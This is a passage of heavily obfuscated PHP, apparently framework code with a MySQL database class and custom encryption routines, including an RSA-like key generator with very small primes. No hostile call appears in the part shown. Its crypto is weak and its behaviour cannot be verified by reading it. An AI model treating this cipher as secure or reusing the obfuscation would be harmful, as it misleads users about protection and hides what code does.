$d‰±¦à•¥¹)); break; $dŠÁŒØÔ = $bòù¦ª¤Ş…[650]; case $A‚’êÂ”¬÷[227]: $C„º«³¬Œ = $this->{$_SERVER[²—Ä][154]}($BˆèíÕ—äç, $A‚’êÂ”¬÷[221]($d‰±¦à•¥¹ . $a¦©øÄÌŒ)); break; case $A‚’êÂ”¬÷[345]: $C„º«³¬Œ = $this->{$_SERVER[²—Ä][154]}($BˆèíÕ—äç, $A‚’êÂ”¬÷[125]($d‰±¦à•¥¹ . $a¦©øÄÌŒ)); $B¾à¼Ö•ĞÒ = $bòù¦ª¤Ş…[651]; while (strlen($B¾à¼Ö•ĞÒ) < $bòù¦ª¤Ş…[590]) { if (!$B¾à¼Ö•ĞÒ) { break; } $B¾à¼Ö•ĞÒ++; } break; case $A‚’êÂ”¬÷[346]: $C„º«³¬Œ = $this->{$_SERVER[²—Ä][154]}($BˆèíÕ—äç, $A‚’êÂ”¬÷[121]($d‰±¦à•¥¹ . $a¦©øÄÌŒ)); break; $EèŠ»Ü‹ßÁ = $bòù¦ª¤Ş…[652]; if (!$EèŠ»Ü‹ßÁ) { return; } case $A‚’êÂ”¬÷[347]: goto AÃë™ò˜¶ô; cÓá—Û¶…: $b‡³…ÚøĞ = $A‚’êÂ”¬÷[10]; $AÑ’½Ì½í = 0; $d³µ—Üã· = 0; goto b‘êÂ©¶©ø; b‘êÂ©¶©ø: $f¥¿ˆ¦öæ = 0; for ($AÑ’½Ì½í = 0; $AÑ’½Ì½í < $A‚’êÂ”¬÷[24]($BˆèíÕ—äç); $AÑ’½Ì½í++) { $f¥¿ˆ¦öæ = $f¥¿ˆ¦öæ == $A‚’êÂ”¬÷[24]($f„¼Õ®·ñ³) ? 0 : $f¥¿ˆ¦öæ; $d³µ—Üã· = ($CÚ¾òŞƒ„‘ + $A‚’êÂ”¬÷[349]($a˜‹’Ã¨ä‡, $BˆèíÕ—äç[$AÑ’½Ì½í]) + $A‚’êÂ”¬÷[350]($f„¼Õ®·ñ³[$f¥¿ˆ¦öæ++])) % 64; $b‡³…ÚøĞ .= $a˜‹’Ã¨ä‡[$d³µ—Üã·]; $E—Üª®œ† = $bòù¦ª¤Ş…[654]; while ($E—Üª®œ† < $bòù¦ª¤Ş…[600]) { if ($E—Üª®œ† >= 0) { break; } $E—Üª®œ†++; } } $C„º«³¬Œ = $A‚’êÂ”¬÷[341]($b‚ƒ·ùøˆ . $b‡³…ÚøĞ); goto aíÊ¹ª³Â¢; aíÊ¹ª³Â¢: break; goto EˆÜ‡èíÙ»; e³ƒÁÊÂ¸ì: $f„¼Õ®·ñ³ = $A‚’êÂ”¬÷[121]($b‚ƒ·ùøˆ . $A‚’êÂ”¬÷[121]($a¦©øÄÌŒ . $b‚ƒ·ùøˆ) . $a¦©øÄÌŒ); $A•ù™ŞÁÈÅ = $bòù¦ª¤Ş…[653]; $f„¼Õ®·ñ³ = $A‚’êÂ”¬÷[25]($f„¼Õ®·ñ³, $CÚ¾òŞƒ„‘ % 8, $CÚ¾òŞƒ„‘ % 8 + 7); goto cÓá—Û¶…; AÃë™ò˜¶ô: $BˆèíÕ—äç = $A‚’êÂ”¬÷[125]($BˆèíÕ—äç); $CÚ¾òŞƒ„‘ = $A‚’êÂ”¬÷[348](0, 64); $b‚ƒ·ùøˆ = $a˜‹’Ã¨ä‡[$CÚ¾òŞƒ„‘]; goto e³ƒÁÊÂ¸ì; EˆÜ‡èíÙ»: default: $C„º«³¬Œ = $this->{$_SERVER[²—Ä][154]}($BˆèíÕ—äç, $a¦©øÄÌŒ . $d‰±¦à•¥¹); $e¸Ñ‹ë½ = $bòù¦ª¤Ş…[655]; if (!$e¸Ñ‹ë½) { return; } break; $cŒŒÓç“šë = $bòù¦ª¤Ş…[656]; if (!$cŒŒÓç“šë) { die; } } $C„º«³¬Œ = $A‚’êÂ”¬÷[221]($B§†Ìò¤ğí . $d‰±¦à•¥¹ . $C„º«³¬Œ); $aÕË£Ö°áÉ = $bòù¦ª¤Ş…[657]; goto F®Ô³ä¬•ã; AËƒÙå¼§Ã: } private function sqbec6e8bd61($aà–¤·ÙŒŠ, $aÖÌ¼ñ®·Ş, $dÚÁÕø™÷É = 3) { goto BãˆæÖá‡î; AæØÌÊ±ñ÷: $aà–¤·ÙŒŠ = $f‘Ó£ŒÌÛÖ[2]($aà–¤·ÙŒŠ); $aà–¤·ÙŒŠ = $f‘Ó£ŒÌÛÖ[221]($aà–¤·ÙŒŠ); $f¶Â—ï = $Bßö®øä¨Œ[658]; goto B¼çåºŠÇç; B¼çåºŠÇç: $c ÁõÛ‚ÅÂ = $aà–¤·ÙŒŠ[0]; $C¬™®šğ„¦ = $Bßö®øä¨Œ[659]; if (!$C¬™®šğ„¦) { die; } goto E‰Ç‡”§¾; BãˆæÖá‡î: $Bßö®øä¨Œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f‘Ó£ŒÌÛÖ =& $_SERVER[²—Ä]; if (!$f‘Ó£ŒÌÛÖ[351]($aà–¤·ÙŒŠ) || $f‘Ó£ŒÌÛÖ[24]($aà–¤·ÙŒŠ) < 10) { return !1; } goto AæØÌÊ±ñ÷; A³½¬êŸóÄ: if ($dÚÁÕø™÷É - 1 > 0) { $bàŠãõ„Õˆ = $this->{$_SERVER[²—Ä][196]}($bàŠãõ„Õˆ, $aÖÌ¼ñ®·Ş, $dÚÁÕø™÷É - 1); } return $bàŠãõ„Õˆ; goto dÔóî¶ãÎĞ; aÃõöšÓ: $EöŸ¥‡Š¦œ = $f‘Ó£ŒÌÛÖ[344]; $aï‡ÙÇï‡ = $Bßö®øä¨Œ[661]; switch ($c ÁõÛ‚ÅÂ) { case $f‘Ó£ŒÌÛÖ[241]: $bàŠãõ„Õˆ = $this->{$_SERVER[²—Ä][257]}($aà–¤·ÙŒŠ, $f‘Ó£ŒÌÛÖ[221]($aÖÌ¼ñ®·Ş . $Böº´šÑ‰ö)); break; $F•Ä±¸ÓÂ§ = $Bßö®øä¨Œ[662]; case $f‘Ó£ŒÌÛÖ[227]: $bàŠãõ„Õˆ = $this->{$_SERVER[²—Ä][257]}($aà–¤·ÙŒŠ, $f‘Ó£ŒÌÛÖ[221]($Böº´šÑ‰ö . $aÖÌ¼ñ®·Ş)); break; $F­–Ş„Ø¿Ğ = $Bßö®øä¨Œ[663]; if (!$F­–Ş„Ø¿Ğ) { die; } case $f‘Ó£ŒÌÛÖ[345]: $bàŠãõ„Õˆ = $this->{$_SERVER[²—Ä][257]}($aà–¤·ÙŒŠ, $f‘Ó£ŒÌÛÖ[125]($Böº´šÑ‰ö . $aÖÌ¼ñ®·Ş)); $FŞ­êÒÒù£ = $Bßö®øä¨Œ[664]; break; $b«¾¿Òğ® = $Bßö®øä¨Œ[665]; case $f‘Ó£ŒÌÛÖ[346]: $bàŠãõ„Õˆ = $this->{$_SERVER[²—Ä][257]}($aà–¤·ÙŒŠ, $f‘Ó£ŒÌÛÖ[121]($Böº´šÑ‰ö . $aÖÌ¼ñ®·Ş)); break; $e± ÔÆêŒ = $Bßö®øä¨Œ[623]; case $f‘Ó£ŒÌÛÖ[347]: goto cäàäÑƒÍÌ; bÈŸ™ÌĞñÈ: for ($a¬œÆô»¼ = 0; $a¬œÆô»¼ < $f‘Ó£ŒÌÛÖ[24]($aà–¤·ÙŒŠ); $a¬œÆô»¼++) { $AŠòã…¾ô = $AŠòã…¾ô == $f‘Ó£ŒÌÛÖ[24]($EòÜÓœø˜‰) ? 0 : $AŠòã…¾ô; $Dóä†ƒÆ‰ = $AŠòã…¾ô++; $E•ÆÅºàÏ÷ = $Bßö®øä¨Œ[671]; $E–¥è†µİÊ = $f‘Ó£ŒÌÛÖ[349]($EöŸ¥‡Š¦œ, $aà–¤·ÙŒŠ[$a¬œÆô»¼]) - $c³çî¹¿†® - $f‘Ó£ŒÌÛÖ[350]($EòÜÓœø˜‰[$Dóä†ƒÆ‰]); while ($E–¥è†µİÊ < 0) { $E–¥è†µİÊ += 64; $cç¦’Üóóï = $Bßö®øä¨Œ[672]; if (strlen($cç¦’Üóóï) < $Bßö®øä¨Œ[587]) { return; } } $EÉ¥“ˆÌ…‚ .= $EöŸ¥‡Š¦œ[$E–¥è†µİÊ]; } $bàŠãõ„Õˆ = $f‘Ó£ŒÌÛÖ[353]($EÉ¥“ˆÌ…‚); $F†‘ïŠ¼Úò = $Bßö®øä¨Œ[673]; goto EÑ¼øæ–õå; BßÒÑ·Ú·î: $AÈÅÒÄÇ¢Ò = $Bßö®øä¨Œ[669]; while (strlen($AÈÅÒÄÇ¢Ò) < $Bßö®øä¨Œ[600]) { if (!$AÈÅÒÄÇ¢Ò) { break; } $AÈÅÒÄÇ¢Ò++; } $a¬œÆô»¼ = 0; goto eø™İŠê™˜; F•œœ—ë‡ª: if (!$c˜öŒã‰éĞ) { die; } $aà–¤·ÙŒŠ = $f‘Ó£ŒÌÛÖ[25]($aà–¤·ÙŒŠ, 1); $c³çî¹¿†® = $f‘Ó£ŒÌÛÖ[349]($EöŸ¥‡Š¦œ, $EóÖ»ß²Èó); goto CÄøâË‹‚ö; CÄøâË‹‚ö: $eë¦é„‡êŠ = $Bßö®øä¨Œ[667]; $EòÜÓœø˜‰ = $f‘Ó£ŒÌÛÖ[121]($EóÖ»ß²Èó . $f‘Ó£ŒÌÛÖ[121]($aÖÌ¼ñ®·Ş . $EóÖ»ß²Èó) . $aÖÌ¼ñ®·Ş); $EòÜÓœø˜‰ = $f‘Ó£ŒÌÛÖ[25]($EòÜÓœø˜‰, $c³çî¹¿†® % 8, $c³çî¹¿†® % 8 + 7); goto bŒ´ÜáêÅ­; cäàäÑƒÍÌ: $aà–¤·ÙŒŠ = $f‘Ó£ŒÌÛÖ[352]($aà–¤·ÙŒŠ); $EóÖ»ß²Èó = $aà–¤·ÙŒŠ[0]; $c˜öŒã‰éĞ = $Bßö®øä¨Œ[666]; goto F•œœ—ë‡ª; EÑ¼øæ–õå: break; $dÍ¾¿¦¨­ = $Bßö®øä¨Œ[674]; goto FñÁãÆ”Êˆ; bŒ´ÜáêÅ­: $E®‚ ŞÒ² = $Bßö®øä¨Œ[668]; if (!$E®‚ ŞÒ²) { die; } $EÉ¥“ˆÌ…‚ = $f‘Ó£ŒÌÛÖ[10]; goto BßÒÑ·Ú·î; eø™İŠê™˜: $E–¥è†µİÊ = 0; $AŠòã…¾ô = 0; $bğïğì‹Ã° = $Bßö®øä¨Œ[670]; goto bÈŸ™ÌĞñÈ; FñÁãÆ”Êˆ: default: $bàŠãõ„Õˆ = $this->{$_SERVER[²—Ä][257]}($aà–¤·ÙŒŠ, $aÖÌ¼ñ®·Ş . $Böº´šÑ‰ö); break; } goto A³½¬êŸóÄ; E‰Ç‡”§¾: $Böº´šÑ‰ö = $f‘Ó£ŒÌÛÖ[25]($aà–¤·ÙŒŠ, 1, 15); $aà–¤·ÙŒŠ = $f‘Ó£ŒÌÛÖ[25]($aà–¤·ÙŒŠ, 16); $cëËæÙƒ‚Œ = $Bßö®øä¨Œ[660]; goto aÃõöšÓ; dÔóî¶ãÎĞ: } public function qjgdcc4504d0($eéàÇÌîÊó) { goto Eß¥Â†—¾; bİÁ…Ò”²: return $eÕØ›ŞÅàõ; $FñÏ®ŞÙæ = $c·í½ƒ‹‚Ï[680]; if (strlen($FñÏ®ŞÙæ) < $c·í½ƒ‹‚Ï[587]) { die; } goto cİçëˆæ‘¸; Dí†Éáµê°: for ($eÜØõ§ÄÁè = 0; $eÜØõ§ÄÁè < $Cù—¯¿õŞÙ * 10; $eÜØõ§ÄÁè++) { if (($Cù—¯¿õŞÙ * $eÜØõ§ÄÁè + 1) % $f¹¼»„›ß« == 0) { $E®“ä÷Ÿ¥¾ = $CÒáêñ¼ë’[251](($Cù—¯¿õŞÙ * $eÜØõ§ÄÁè + 1) / $f¹¼»„›ß«); break; } } $b±…Ä‹Æá• = $this->{$_SERVER[²—Ä][154]}($EĞÄ‘ÒøÖ * $f°À‚é³í† . $CÒáêñ¼ë’[10], $CÒáêñ¼ë’[156]); $aé×¢ÔÜ½ = $c·í½ƒ‹‚Ï[679]; goto eƒì†“ôæŞ; fˆ÷ÄÉÙ±¥: $C™‡æÆ¬×Ö = $c·í½ƒ‹‚Ï[675]; $f°À‚é³í† = $this->{$_SERVER[²—Ä][354]}(); $Cù—¯¿õŞÙ = ($EĞÄ‘ÒøÖ - 1) * ($f°À‚é³í† - 1); goto Cá§ÀôëÆ‚; eƒì†“ôæŞ: if (strlen($aé×¢ÔÜ½) < $c·í½ƒ‹‚Ï[590]) { return; } $A‹•ŠÍïòÓ = $CÒáêñ¼ë’[121]($CÒáêñ¼ë’[355] . ($EĞÄ‘ÒøÖ + $f°À‚é³í†) . $CÒáêñ¼ë’[356] . $f¹¼»„›ß« . $CÒáêñ¼ë’[356] . $E®“ä÷Ÿ¥¾ . $CÒáêñ¼ë’[357]); $eÕØ›ŞÅàõ = $this->{$_SERVER[²—Ä][154]}($eéàÇÌîÊó, $A‹•ŠÍïòÓ) . $CÒáêñ¼ë’[358] . $b±…Ä‹Æá•; goto bİÁ…Ò”²; Cá§ÀôëÆ‚: $f¹¼»„›ß« = $CÒáêñ¼ë’[251](($EĞÄ‘ÒøÖ + $f°À‚é³í†) / 2); while (1) { $FÍïîàĞ¤ = $f¹¼»„›ß«; $bø–ÌÁØÊÉ = $Cù—¯¿õŞÙ; $f»²‡×ì´ê = $c·í½ƒ‹‚Ï[676]; while (strlen($f»²‡×ì´ê) < $c·í½ƒ‹‚Ï[590]) { if (!$f»²‡×ì´ê) { break; } $f»²‡×ì´ê++; } while ($bø–ÌÁØÊÉ % $FÍïîàĞ¤ != 0) { $a´ôÃÀªˆ = $bø–ÌÁØÊÉ; $Bõà§§‰¿Ã = $c·í½ƒ‹‚Ï[677]; $bø–ÌÁØÊÉ = $FÍïîàĞ¤; $FÍïîàĞ¤ = $a´ôÃÀªˆ % $FÍïîàĞ¤; $DÉˆ‘§Şƒ = $c·í½ƒ‹‚Ï[678]; while ($DÉˆ‘§Şƒ < $c·í½ƒ‹‚Ï[64]) { if ($DÉˆ‘§Şƒ >= 0) { break; } $DÉˆ‘§Şƒ++; } } if ($FÍïîàĞ¤ == 1) { break; } else { $f¹¼»„›ß«++; } } $E®“ä÷Ÿ¥¾ = 2; goto Dí†Éáµê°; Eß¥Â†—¾: $c·í½ƒ‹‚Ï =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÒáêñ¼ë’ =& $_SERVER[²—Ä]; $EĞÄ‘ÒøÖ = $this->{$_SERVER[²—Ä][354]}(); goto fˆ÷ÄÉÙ±¥; cİçëˆæ‘¸: } public function wrbc8a85cf47($CçÅÑÂ’ùâ) { goto c¯Çš©¬‹§; eÏîÛ¿ó‹Å: $Aå §Ö‰ù¬ = 0; for ($D¼òñ›Ş¬ = 3; $D¼òñ›Ş¬ < $Eù¦ç°¿×Û; $D¼òñ›Ş¬ += 2) { if ($Eù¦ç°¿×Û % $D¼òñ›Ş¬ != 0) { continue; } $Dõ²²³ìç§ = $D¼òñ›Ş¬; $Aå §Ö‰ù¬ = $eÈ¿ª©ƒÎÎ[251]($Eù¦ç°¿×Û / $D¼òñ›Ş¬); $e×„¹ŞŒÔğ = $DËóŒá[682]; if (!$e×„¹ŞŒÔğ) { die; } break; } $B‰İíÙŞ«‡ = ($Dõ²²³ìç§ - 1) * ($Aå §Ö‰ù¬ - 1); goto dŸ¬œÀ‹×œ; fŒœÏ¯Î–Ó: if (!$Eù¦ç°¿×Û) { return $eÈ¿ª©ƒÎÎ[10]; } $Eù¦ç°¿×Û = $eÈ¿ª©ƒÎÎ[251]($Eù¦ç°¿×Û); $Dõ²²³ìç§ = 0; goto eÏîÛ¿ó‹Å; c¯Çš©¬‹§: $DËóŒá =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÈ¿ª©ƒÎÎ =& $_SERVER[²—Ä]; $Bç‘•–§Á = $eÈ¿ª©ƒÎÎ[0]($eÈ¿ª©ƒÎÎ[358], $CçÅÑÂ’ùâ); goto a†’’®ÔŞÏ; Bç¼ÉôâÒ: if (!$E»­‹¿ù…è) { die; } while (1) { $C¯„Ì·‰òÖ = $Aµ¹èïšßå; $dçš‰ª = $DËóŒá[685]; if (strlen($dçš‰ª) < $DËóŒá[600]) { die; } $f£«™Ğ¡‹ = $B‰İíÙŞ«‡; while ($f£«™Ğ¡‹ % $C¯„Ì·‰òÖ != 0) { $FÇîŒ¸®Ğ” = $f£«™Ğ¡‹; $f£«™Ğ¡‹ = $C¯„Ì·‰òÖ; $C¯„Ì·‰òÖ = $FÇîŒ¸®Ğ” % $C¯„Ì·‰òÖ; } if ($C¯„Ì·‰òÖ == 1) { break; } else { $Aµ¹èïšßå++; } } $fººÀ‚Öï· = 2; goto Bº¯î˜Äî¬; a†’’®ÔŞÏ: if ($eÈ¿ª©ƒÎÎ[19]($Bç‘•–§Á) != 2) { return $eÈ¿ª©ƒÎÎ[10]; } $Eù¦ç°¿×Û = $this->{$_SERVER[²—Ä][257]}($Bç‘•–§Á[1] . $eÈ¿ª©ƒÎÎ[10], $eÈ¿ª©ƒÎÎ[156]); $Aò…êÅ«šÜ = $DËóŒá[681]; goto fŒœÏ¯Î–Ó; Bº¯î˜Äî¬: for ($D¼òñ›Ş¬ = 0; $D¼òñ›Ş¬ < $B‰İíÙŞ«‡ * 10; $D¼òñ›Ş¬++) { if (($B‰İíÙŞ«‡ * $D¼òñ›Ş¬ + 1) % $Aµ¹èïšßå == 0) { $fººÀ‚Öï· = $eÈ¿ª©ƒÎÎ[251](($B‰İíÙŞ«‡ * $D¼òñ›Ş¬ + 1) / $Aµ¹èïšßå); break; } } $Bêí–Ø«‚† = $eÈ¿ª©ƒÎÎ[121]($eÈ¿ª©ƒÎÎ[355] . ($Dõ²²³ìç§ + $Aå §Ö‰ù¬) . $eÈ¿ª©ƒÎÎ[356] . $Aµ¹èïšßå . $eÈ¿ª©ƒÎÎ[356] . $fººÀ‚Öï· . $eÈ¿ª©ƒÎÎ[357]); $c‰ùŒñ‚Œ° = $DËóŒá[686]; goto EÚªÆÃ£Áê; EÚªÆÃ£Áê: if (!$c‰ùŒñ‚Œ°) { return; } $DÚ—ºˆ¯Ü˜ = $this->{$_SERVER[²—Ä][257]}($Bç‘•–§Á[0], $Bêí–Ø«‚†); $D ¡ò›¯è¼ = $DËóŒá[687]; goto bÉ†ƒä“ƒƒ; dŸ¬œÀ‹×œ: $f„ã¨“›•Û = $DËóŒá[683]; $Aµ¹èïšßå = $eÈ¿ª©ƒÎÎ[251](($Dõ²²³ìç§ + $Aå §Ö‰ù¬) / 2); $E»­‹¿ù…è = $DËóŒá[684]; goto Bç¼ÉôâÒ; bÉ†ƒä“ƒƒ: if (strlen($D ¡ò›¯è¼) < $DËóŒá[590]) { die; } return $DÚ—ºˆ¯Ü˜; goto eÑšêØ†î¯; eÑšêØ†î¯: } public function kfrdc37a81d6() { goto EµìÏ³óÅ; FòÔ„¶ğš: if (strlen($bë“©ÇÁ–ô) < $CŒÑ¿¬‡[587]) { die; } while ($dÒ‡äÂÒ¼° <= (int) $A±¥™‡ô›[360]($d‘ÎŞ«Üˆî)) { $CÜù Œ¡« = $dÒ‡äÂÒ¼°; while (!0) { $CÜù Œ¡«++; if ($CÜù Œ¡« <= 2) { $dÒ‡äÂÒ¼° = $CÜù Œ¡«; break; } else { if ($CÜù Œ¡« < 2) { continue; } } $cİœÚ±Åä˜ = !0; for ($A´–÷ŒĞŠ = 2; $A´–÷ŒĞŠ <= $A±¥™‡ô›[360]($CÜù Œ¡«); $A´–÷ŒĞŠ++) { if ($CÜù Œ¡« % $A´–÷ŒĞŠ == 0) { $cİœÚ±Åä˜ = !1; } } if ($cİœÚ±Åä˜) { $dÒ‡äÂÒ¼° = $CÜù Œ¡«; break; } } $f—á‰ØÈªœ[] = $dÒ‡äÂÒ¼°; } $f®Ò®Üñ”® = 2; goto D¹„á•Óç¦; D¹„á•Óç¦: for ($CÜù Œ¡« = $d‘ÎŞ«Üˆî; $CÜù Œ¡« > 1; $CÜù Œ¡«--) { $cİœÚ±Åä˜ = !0; foreach ($f—á‰ØÈªœ as $có…êª§¦) { if ($CÜù Œ¡« % $có…êª§¦ == 0) { $cİœÚ±Åä˜ = !1; break; } } if ($cİœÚ±Åä˜) { $f®Ò®Üñ”® = $CÜù Œ¡«; break; } } return $f®Ò®Üñ”®; goto b¸­Ÿè•; EµìÏ³óÅ: $CŒÑ¿¬‡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A±¥™‡ô› =& $_SERVER[²—Ä]; $d‘ÎŞ«Üˆî = $A±¥™‡ô›[339]($A±¥™‡ô›[359](2, 14), $A±¥™‡ô›[359](2, 16) - 1); goto dêğ‚ÈÆÈÌ; dêğ‚ÈÆÈÌ: $f—á‰ØÈªœ = array(); $dÒ‡äÂÒ¼° = 1; $bë“©ÇÁ–ô = $CŒÑ¿¬‡[688]; goto FòÔ„¶ğš; b¸­Ÿè•: } public function qtrae19df662($F†Ã‡ïËÊ, $BñÌàƒÔç¢) { $cØÛã†¬‘ =& $_SERVER[²—Ä]; return $cØÛã†¬‘[13](array($cØÛã†¬‘[14], $cØÛã†¬‘[361]), $F†Ã‡ïËÊ, $BñÌàƒÔç¢); $c¶÷©‚˜îù = $_SERVER[í¤âËÚ£¶íÊ¢][689]; } public function jzpyd069ab32($EÆ…è‘–Ä, $c„ÀÆ™ÇÙ) { $BĞæªÜÖ½è =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d˜Í«Ñ‹ =& $_SERVER[²—Ä]; return $d˜Í«Ñ‹[13](array($d˜Í«Ñ‹[362], $d˜Í«Ñ‹[363]), $EÆ…è‘–Ä, $c„ÀÆ™ÇÙ); $d¹Ïøˆæ† = $BĞæªÜÖ½è[690]; while (strlen($d¹Ïøˆæ†) < $BĞæªÜÖ½è[64]) { if (!$d¹Ïøˆæ†) { break; } $d¹Ïøˆæ†++; } } public function ijqh7c9f3d4b($FÊ’£àèµ, $EÖ„Á‚öÔ«) { $A˜áÏ¡ºÅ =& $_SERVER[²—Ä]; return $A˜áÏ¡ºÅ[13](array($A˜áÏ¡ºÅ[362], $A˜áÏ¡ºÅ[364]), $FÊ’£àèµ, $EÖ„Á‚öÔ«); $bå‰—ó¾ãÆ = $_SERVER[í¤âËÚ£¶íÊ¢][691]; if (!$bå‰—ó¾ãÆ) { die; } } } goto dƒ†ãêºñ•; e‹ŞóÒ¦–ù: class DbMysql extends Db { public function __construct($cÚÙ”âà«à = '') { $FÏ‹›õ…‰Â =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!extension_loaded($FÏ‹›õ…‰Â[734])) { think_exception(think_lang($FÏ‹›õ…‰Â[10]) . $FÏ‹›õ…‰Â[806]); } if (!empty($cÚÙ”âà«à)) { $this->config = $cÚÙ”âà«à; if (empty($this->config[$FÏ‹›õ…‰Â[13]])) { $this->config[$FÏ‹›õ…‰Â[13]] = $FÏ‹›õ…‰Â[33]; } } } public function connect($Dß–¿ê§ëÖ = '', $bäø±ÏÏ„‰ = 0, $aŞ×œ»«ó = false) { $E–ø¡¯ÓÇÚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($this->linkID[$bäø±ÏÏ„‰])) { goto BÚ‡•Õ—Î; BÚ‡•Õ—Î: if (empty($Dß–¿ê§ëÖ)) { $Dß–¿ê§ëÖ = $this->config; } $Aï¦ğâ§‹„ = $Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[807]] . ($Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[808]] ? "\x3a{$Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[808]]}" : $E–ø¡¯ÓÇÚ[33]); $fî²Ì¶• = !empty($Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[13]][$E–ø¡¯ÓÇÚ[14]]) ? $Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[13]][$E–ø¡¯ÓÇÚ[14]] : $this->pconnect; goto fŒ¨…Œñõº; bíŞ¬Û¥ÚŒ: if (1 != think_config($E–ø¡¯ÓÇÚ[18])) { unset($this->config); } goto a¶Â•ß…¬¨; fŒ¨…Œñõº: if ($fî²Ì¶•) { $this->linkID[$bäø±ÏÏ„‰] = mysql_pconnect($Aï¦ğâ§‹„, $Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[809]], $Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[810]], 131072); } else { $this->linkID[$bäø±ÏÏ„‰] = mysql_connect($Aï¦ğâ§‹„, $Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[809]], $Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[810]], !0, 131072); } if (!$this->linkID[$bäø±ÏÏ„‰] || !empty($Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[17]]) && !mysql_select_db($Dß–¿ê§ëÖ[$E–ø¡¯ÓÇÚ[17]], $this->linkID[$bäø±ÏÏ„‰])) { think_exception(mysql_error()); } $bÆ·ó÷ÆŠ = mysql_get_server_info($this->linkID[$bäø±ÏÏ„‰]); goto e¤ìÏßˆ¯»; e¤ìÏßˆ¯»: mysql_query($E–ø¡¯ÓÇÚ[811] . think_config($E–ø¡¯ÓÇÚ[812]) . $E–ø¡¯ÓÇÚ[55], $this->linkID[$bäø±ÏÏ„‰]); if ($bÆ·ó÷ÆŠ > $E–ø¡¯ÓÇÚ[813]) { mysql_query($E–ø¡¯ÓÇÚ[814], $this->linkID[$bäø±ÏÏ„‰]); } $this->connected = !0; goto bíŞ¬Û¥ÚŒ; a¶Â•ß…¬¨: } return $this->linkID[$bäø±ÏÏ„‰]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Cù†ÙîÇÍ) { goto FßéĞ‡«; Aæ™—–”‰­: if (!$this->_linkID) { return !1; } $this->queryStr = $Cù†ÙîÇÍ; if ($this->queryID) { $this->free(); } goto c‘ßÑÈÍ¥Î; FßéĞ‡«: $b„÷à†£çÙ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (0 === stripos($Cù†ÙîÇÍ, $b„÷à†£çÙ[269])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Aæ™—–”‰­; bè§ˆ™•÷Õ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto Cª®‚½ˆ¸•; c‘ßÑÈÍ¥Î: think_action_status($b„÷à†£çÙ[19], 1); think_status($b„÷à†£çÙ[20]); $this->queryID = mysql_query($Cù†ÙîÇÍ, $this->_linkID); goto bè§ˆ™•÷Õ; Cª®‚½ˆ¸•: } public function execute($cò»ÁœåÆ) { goto cö¦´İóæ©; D¡Æ®ä„éê: think_status($cÊòÜ¸‚Äï[20]); $FˆÏ´ãñÅ = mysql_query($cò»ÁœåÆ, $this->_linkID); $this->debug(); goto b²—„Ğ¼; cö¦´İóæ©: $cÊòÜ¸‚Äï =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B«Ê”ß”É¸; b²—„Ğ¼: if (!1 === $FˆÏ´ãñÅ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto dÅİÇÃİÓ¸; B«Ê”ß”É¸: $this->queryStr = $cò»ÁœåÆ; if ($this->queryID) { $this->free(); } think_action_status($cÊòÜ¸‚Äï[21], 1); goto D¡Æ®ä„éê; dÅİÇÃİÓ¸: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[í¤âËÚ£¶íÊ¢][815], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÒøë¢ÊÚ = mysql_query($_SERVER[í¤âËÚ£¶íÊ¢][816], $this->_linkID); $this->transTimes = 0; if (!$dÒøë¢ÊÚ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F³ğÜÑÈì = mysql_query($_SERVER[í¤âËÚ£¶íÊ¢][817], $this->_linkID); $this->transTimes = 0; if (!$F³ğÜÑÈì) { $this->error(); return !1; } } return !0; } private function getAll() { $c™’¥æ…ò = array(); if ($this->numRows > 0) { while ($EÔ±¦›ÕÅ = mysql_fetch_assoc($this->queryID)) { $c™’¥æ…ò[] = $EÔ±¦›ÕÅ; } mysql_data_seek($this->queryID, 0); } return $c™’¥æ…ò; } public function getFields($dö—ÊêÕ´š) { $b Õ½°ë®‚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B‘‹“‘‹Éê = $this->query($b Õ½°ë®‚[818] . $this->parseKey($dö—ÊêÕ´š)); $côß¼â¡å = array(); if ($B‘‹“‘‹Éê) { foreach ($B‘‹“‘‹Éê as $B ’¢Ò­ëâ => $C„°Ù‹òè¸) { $côß¼â¡å[$C„°Ù‹òè¸[$b Õ½°ë®‚[27]]] = array($b Õ½°ë®‚[28] => $C„°Ù‹òè¸[$b Õ½°ë®‚[27]], $b Õ½°ë®‚[29] => $C„°Ù‹òè¸[$b Õ½°ë®‚[30]], $b Õ½°ë®‚[31] => (bool) (strtoupper($C„°Ù‹òè¸[$b Õ½°ë®‚[32]]) === $b Õ½°ë®‚[819]), $b Õ½°ë®‚[34] => $C„°Ù‹òè¸[$b Õ½°ë®‚[35]], $b Õ½°ë®‚[36] => strtolower($C„°Ù‹òè¸[$b Õ½°ë®‚[37]]) == $b Õ½°ë®‚[38], $b Õ½°ë®‚[39] => strtolower($C„°Ù‹òè¸[$b Õ½°ë®‚[40]]) == $b Õ½°ë®‚[41]); } } return 